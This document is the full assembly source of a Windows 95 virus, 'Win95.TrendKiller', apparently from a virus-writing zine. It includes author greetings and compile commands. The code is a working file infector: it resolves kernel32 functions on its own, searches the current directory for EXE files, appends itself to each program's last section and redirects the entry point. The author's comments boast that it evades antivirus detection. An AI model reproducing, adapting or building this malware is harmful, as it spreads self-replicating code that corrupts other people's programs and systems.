; Win95.TrendKiller
;   Written By Rat Heart /Assoc. of Satanic Maniac's!

; Currently, this virus infects all Win32 PE EXE's in the
; current directory, although I plan to make this Resident
; by the next zine release! ;)

; I think it's kinda funny, I created an optimised version of
; this virus, and infected a load of EXE's from the Windozy
; directory, they scanned as suspicious in AVP, but this version
; when on the same files are said to be clean! Here goes to
; UN-optimisation!!!!! ;)

; In order for me to produce this, I had a lot of help from
; an old friend, Ruiner, who was part of SOS, the CIH, and
; now is retiring..
;   Thankz! I could not have made this without Your help!

; Greetz.....
;   Ruiner         You help loads, thanx man!
;   Renegade       Wow, Have you seen our Zine?! :) It's packed! ;)
;   Slage Hammer   Thanx for all yer help, in and out of Vx!
;   Grit           Simplicity is the key!
;   Man in Black   Where the hell have you gone?

; To Compile....
;@echo off
;\asm\tasm32 /ml /m5 TRNDKILL,TRNDKILL,TRNDKILL
;\asm\tlink32 /Tpe /aa /c TRNDKILL,,,Import32.Lib
;pewrsec TRNDKILL.EXE


; "Don't Mistake Lack Of Talent For Genius!" - Type O Negative

                .386p
                .model flat

extrn   ExitProcess:PROC


        iNCLUDE RUiNER.iNC              ;Thanx for the Inc Ruinz!

KERN32          equ     0BFF70000h
VxMarker        equ     20400020h

                .data
dh      db      '.'

                .code

vstart: xchg    ebp,eax
        sub     ebp,offset vstart

cryptstart:
        mov     eax,[ebp+offset TheHostRetAddr]
        mov     [ebp+offset RestoreHostAddress],eax

        mov     edi,KERN32
        cmp     word ptr [edi],'ZM'             ;MZ
        jne     RestoreHost                     ;Not Win95
        add     edi,dword ptr [edi+3Ch]
        cmp     word ptr [edi],4550h            ;PE/0/0
        jne     RestoreHost                     ;Not Win95
        mov     edi,[edi+78h]                   ;EDI = Export RVA of Kern32
        add     edi,KERN32                      ;EDI = Export Address (VA)
        mov     esi,[edi+20h]                   ;ESI = Name Ptr Table
        add     esi,KERN32
        mov     ecx,[edi+24h]                   ;ECX = Ordinal Table
        add     ecx,KERN32
        mov     dword ptr [ebp+offset OrdTbl],ecx
        mov     ecx,[edi+1Ch]                   ;ECX = Address Table
        add     ecx,KERN32
        mov     dword ptr [ebp+offset AdrTbl],ecx

        mov     ecx,[edi+18h]                   ;ECX = Number of Names
        mov     edx,ecx                         ;EDX = Number of Names

FindGPA:                                        ;'GetProcAddress',0
        lodsd
        add     eax,KERN32                      ;Virt. Address of Name
        cmp     dword ptr [eax],'PteG'
        jne     NotGPA
        cmp     dword ptr [eax+4h],'Acor'
        je      WorkOutRVA                      ;GetProcA
NotGPA: loop    FindGPA

RestoreHost:
        push    offset NotGPA
        ret
RestoreHostAddress      equ     offset RestoreHost + 1

WorkOutRVA:
        sub     edx,ecx                         ;API Number (Max - Left)
        shl     edx,1                           ;EDX = Ordinal Index
        add     edx,dword ptr [ebp+offset OrdTbl]       ;EDX = Adr of Ordinal
        xor     eax,eax
        add     ax, word ptr [edx]              ;AX = Ordinal
        shl     eax,2h
        add     eax,dword ptr [ebp+offset AdrTbl]       ;EAX = Addr of RVA
        mov     edx,[eax]                       ;EDX = RVA of GPA
        add     edx,KERN32                      ;EDX = Virt. Addr of GPA!
        mov     dword ptr [ebp+offset GetProcAddr],edx

        lea     edi,[ebp+offset FindFirst]

        lea     eax,[ebp+offset n_FindFirst]
        call    GetNSave

        lea     eax,[ebp+offset n_FindNext]
        call    GetNSave

        lea     eax,[ebp+offset n_lopen]
        call    GetNSave

        lea     eax,[ebp+offset n_lclose]
        call    GetNSave

        lea     eax,[ebp+offset n_lread]
        call    GetNSave

        lea     eax,[ebp+offset n_lwrite]
        call    GetNSave

        lea     eax,[ebp+offset n_llseek]
        call    GetNSave

FindTheFirstFile:
        lea     eax,[ebp+offset FoundFile]
        push    eax
        lea     eax,[ebp+offset FlID]
        push    eax
        call    dword ptr [ebp+offset FindFirst]
        cmp     eax,INVALID_HANDLE_VALUE
        je      RestoreHost
        mov     [ebp+offset FindHnd],eax

GotOne: call    Infexion
        lea     eax,[ebp+offset FoundFile]
        push    eax
        push    dword ptr [ebp+offset FindHnd]
        call    dword ptr [ebp+offset FindNext]
        cmp     eax,0h
        jne     GotOne

        jmp     RestoreHost

VxID            db      '[Win95.TrendKiller]',0
AuID            db      '[Rat Heart /ASM]',0
FlID            db      '*.EXE',0
TheHostRetAddr  dd      0BFF8AECDh

n_FindFirst     db      'FindFirstFileA',0
n_FindNext      db      'FindNextFileA',0
n_lopen         db      '_lopen',0
n_lclose        db      '_lclose',0
n_lread         db      '_lread',0
n_lwrite        db      '_lwrite',0
n_llseek        db      '_llseek',0

GetNSave:
        push    eax
        push    KERN32
        call    dword ptr [ebp+offset GetProcAddr]
        stosd
        ret

Infexion:
        push    OF_READWRITE
        lea     eax,[ebp+offset FoundFile.WFD_szFileName]
        push    eax
        call    dword ptr [ebp+offset lopen]
        cmp     eax,INVALID_HANDLE_VALUE
        je      FeckOff
        mov     [ebp+offset FileHnd],eax

        call    ReadBuffer

        cmp     word ptr [ebp+offset Buffer],'ZM'
        jne     FeckThis
        mov     eax,dword ptr [ebp+offset FlAlg]
        mov     dword ptr [ebp+offset POffset],eax      ;Save PE Offset

        xor     eax,eax
        call    GotoPEwithOffset                        ;Goto PE!

        call    ReadBuffer

        cmp     word ptr [ebp+offset Buffer],'EP'
        jne     FeckThis

        cmp     dword ptr [ebp+offset VxChk],VxMarker
        je      FeckThis

        mov     eax,[ebp+offset Entry]
        mov     [ebp+offset TheHostRetAddr],eax

        mov     eax,[ebp+offset ImgBs]
        add     dword ptr [ebp+offset TheHostRetAddr],eax

        xor     eax,eax
        mov     ax,word ptr [ebp+offset NoObj]
        dec     ax                              ;Goto last Obj
        mov     ecx,Objlen                      ;Offset from top 
        mul     cx                              ;of Obj Table!

        add     ax,0F8h                         ;Align to PE header
        mov     word ptr [ebp+offset ObjOff],ax

        mov     eax,dword ptr [ebp+offset ObjOff]
        call    GotoPEwithOffset                        ;Goto last Obj

        call    PushObjBuf2File
        call    dword ptr [ebp+offset lread]            ;Read Object

        call    PatchObj

        xor     eax,eax
        mov     ax,word ptr [ebp+offset ObjOff]
        call    GotoPEwithOffset                        ;Goto last Obj

WriteNewPE:
        call    PushObjBuf2File
        call    dword ptr [ebp+offset lwrite]

        xor     eax,eax
        call    GotoPEwithOffset                        ;Goto PE!

        push    60h
        lea     eax,[ebp+offset Buffer]
        call    PushEaxFileWrite

        push    FILE_BEGIN
        push    dword ptr [ebp+offset VirusOff]
        push    dword ptr [ebp+offset FileHnd]
        call    dword ptr [ebp+offset llseek]

        push    vir_len
        lea     eax,[ebp+offset vstart]
        call    PushEaxFileWrite

FeckThis:
        push    dword ptr [ebp+offset FileHnd]
        call    dword ptr [ebp+offset lclose]

FeckOff:
        ret

PushEaxFileWrite:
        pop     edi
        push    eax
        push    dword ptr [ebp+offset FileHnd]
        call    dword ptr [ebp+offset lwrite]
        push    edi
        ret

PushObjBuf2File:
        pop     edi
        push    Objlen
        lea     eax,[ebp+offset Buffer2]
        push    eax
        push    dword ptr [ebp+offset FileHnd]
        push    edi
        ret

PatchObj:
        mov     eax,[ebp+offset Obj1poffs]
        add     eax,[ebp+offset Obj1psize]              ;End of Object
        mov     [ebp+offset VirusOff],eax

        mov     [ebp+offset Obj1flags],0C0000040h
        mov     dword ptr [ebp+offset VxChk],VxMarker

        mov     eax,[ebp+offset Obj1rva]
        mov     [ebp+offset Entry],eax
        mov     eax,[ebp+offset Obj1psize]
        add     dword ptr [ebp+offset Entry],eax

        add     dword ptr [ebp+offset Obj1psize],vir_len
        add     dword ptr [ebp+offset Obj1vsize],vtl_len

        ret

GotoPEwithOffset:               ;In => EAX = Offset
        mov     edx,dword ptr [ebp+offset POffset]
        add     edx,eax
        push    FILE_BEGIN
        push    edx
        push    dword ptr [ebp+offset FileHnd]
        call    dword ptr [ebp+offset llseek]   ;Goto PE Obj Table
        ret

ReadBuffer:
        push    60h
        lea     eax,[ebp+offset Buffer]
        push    eax
        push    dword ptr [ebp+offset FileHnd]
        call    dword ptr [ebp+offset lread]
        ret

cryptend:
vend:

GetProcAddr     dd      0
FindFirst       dd      0
FindNext        dd      0
lopen           dd      0
lclose          dd      0
lread           dd      0
lwrite          dd      0
llseek          dd      0

FindHnd         dd      0
FileHnd         dd      0
OrdTbl          dd      0
AdrTbl          dd      0
ExportObj       dd      0
POffset         dd      0
VirusOff        dd      0
ObjOff          dd      0

FoundFile       WIN32_FIND_DATA ?

Buffer          equ             $

CPUty           equ             offset Buffer+04h
NoObj           equ             offset Buffer+06h
VxChk           equ             offset Buffer+10h
Entry           equ             offset Buffer+28h
ImgBs           equ             offset Buffer+34h
ObjAl           equ             offset Buffer+38h
FlAlg           equ             offset Buffer+3Ch
Chxum           equ             offset Buffer+58h
SbSys           equ             offset Buffer+5Ch

Buffer2         equ             offset Buffer+60h
Obj1vsize       equ             offset Buffer2+8h
Obj1rva         equ             offset Buffer2+0Ch
Obj1psize       equ             offset Buffer2+10h
Obj1poffs       equ             offset Buffer2+14h
Obj1flags       equ             offset Buffer2+Objlen-4h

Buffer3         equ             offset Buffer2+Objlen
Obj2vsize       equ             offset Buffer3+8h
Obj2rva         equ             offset Buffer3+0Ch
Obj2psize       equ             offset Buffer3+10h
Obj2poffs       equ             offset Buffer3+14h
Obj2flags       equ             offset Buffer3+Objlen-4h

Buffer4         equ             offset Buffer3+Objlen

Objlen          equ     28h

vir_len equ     offset vend - offset vstart
wrd_len equ     (offset vend - offset vstart)/2
dwd_len equ     (offset vend - offset vstart)/4
cry_len equ     (offset cryptend - offset cryptstart)
crw_len equ     (offset cryptend - offset cryptstart)/2
crd_len equ     (offset cryptend - offset cryptstart)/4
buf_len equ     offset Buffer4 - offset vend
vtl_len equ     buf_len + vir_len

        end     vstart
